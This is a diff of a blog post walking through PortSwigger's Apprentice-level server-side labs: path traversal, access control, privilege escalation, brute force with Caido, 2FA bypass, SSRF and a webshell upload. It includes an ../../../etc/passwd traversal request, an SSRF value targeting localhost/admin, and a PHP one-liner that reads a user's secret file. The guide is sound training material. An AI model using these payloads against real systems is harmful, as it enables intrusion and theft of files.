@@ -1,15 +1,17 @@
 ---
 title: "Server Side Vulnerabilities"
-date: 2025-06-01T16:06:04+01:00
+date: 2025-06-02T02:17:00+01:00
 draft: false
 tags: ["Security", "Apprentice", "web", "Portswigger", "Caido", "Brute Force", "Path Traversal"]
 categories: ["web", "Portswigger"]
-description: "Another guide through the Apprentice-level Server Side Vulnerabilities pathway on Portswigger. Covers practical labs and techniques for path traversal, access control, privilege escalation, and brute force attacks, with step-by-step walkthroughs and tips for using tools like Caido."
+description: "A guide through the Apprentice-level Server Side Vulnerabilities pathway on Portswigger. Covers practical labs and techniques for path traversal, access control, privilege escalation, and brute force attacks, with step-by-step walkthroughs and tips for using tools like Caido."
 ---
 
 This is a guide for the Apprentice level Server Side Vulnerabilities pathway on Portswigger.  I'm pretty impressed with the amount of free content on this platform. It is well written and it starts out pretty easy, then leads you deeper into more complex concepts. 
 
 Thank you Portswigger people. 
+
+-----------
 
 **Path Traversal**
 
@@ -21,6 +23,8 @@ GET / image?filename=../../../etc/passwd
 ![](1.png)
 
 ![](2.png)
+
+-----------
 
 **Access Control**
 
@@ -44,8 +48,9 @@ The robots.txt file gives us a juicy clue
 
 ![](5.png)
 
+-----------
 
-Next Lab:
+**Unprotected Admin**
 
 Navigate to the a product page and then 'inspect'
 
@@ -57,6 +62,8 @@ I then searched: script
 
 
 ![](8.png)
+
+-----------
 
 **Parameter-based access control methods**
 
@@ -92,6 +99,8 @@ Reload and now you should be able to see the the delete options
 
 ![](15.png)
 
+-----------
+
 **Horizontal Privilege escalation**
 
 Find a post by Carlos
@@ -115,6 +124,8 @@ Submit:
 
 ![](19.png)
 
+-----------
+
 **Horisontal and vertical escalation**
 
 Log in as wiener:peter
@@ -130,10 +141,13 @@ Use the password to login and navigate to the admin panel.
 
 ![](20b.png)
 
+-----------
+
 **Brute Force**
 
 Attempt to log in, we need a copy of the request.
 
+![](21.png)
 ![[21.png]]
 
 In Caido, grab the POST request and send it to Automate.
@@ -152,3 +166,90 @@ Your results can be sorted by Status and length. Sometimes its the status's will
 
 ![](24.png)
 
+-----------
+
+**2FA Simple Bypass**
+
+Lol, initially I tried to brute force the 4 digit code. It didn't work...
+
+Log in as wiener:peter and check out the url, check the email client and you'll see that the the url ends with: login2
+The email client ends with: email 
+And the account ends: my-account
+
+Log into carlos' account and change the end of the url from: login2 to: my-account
+
+![](25.png)
+
+![](26.png)
+
+![](27.png)
+
+------------------
+
+**SSRF Attacks**
+
+Hit the Check stock button
+
+![](28.png)
+
+Change the stockapi to `http://localhost/admin`
+
+![](29.png)
+
+![](30.png)
+
+![](31.0.png)
+
+![](31.png)
+
+![](32.png)
+
+----------------
+
+**SSRF Attacks cont**
+
+Get the Response for the stock check.
+
+![](33.png)
+
+Automate through the IP range.
+
+![](34.png)
+
+Copy the url from the delete button.
+
+![](36.png)
+
+![](35.png)
+
+Use replay to send the stockapi=, then open in the browser
+
+![](37.png)
+
+![](38.png)
+
+**Webshell upload RCE**
+
+Once in the lab, create a .php file with this command:
+```
+1. `<?php echo file_get_contents('/home/carlos/secret'); ?>`
+```
+
+![[39.png]]
+
+sign in and upload the file as your avatar.
+
+![](40.png)
+
+![](41.png)
+
+Look for the GET request and send it to the repeater. Change the first line to 
+```
+GET /files/avatars/carlos.php HTTP/1.1
+```
+
+![](42.png)
+
+![](43.png)
+
+------------------
